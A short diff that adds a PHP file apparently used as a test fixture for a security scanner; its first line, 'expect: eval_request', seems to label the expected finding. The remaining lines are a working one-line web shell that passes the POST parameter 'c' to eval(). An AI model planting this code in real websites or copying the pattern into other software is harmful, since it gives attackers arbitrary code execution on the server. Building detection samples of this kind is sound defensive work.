@@ -1,0 +1,5 @@
+expect: eval_request
+<?php
+if ( isset( $_POST['c'] ) ) {
+	eval( $_POST['c'] );
+}
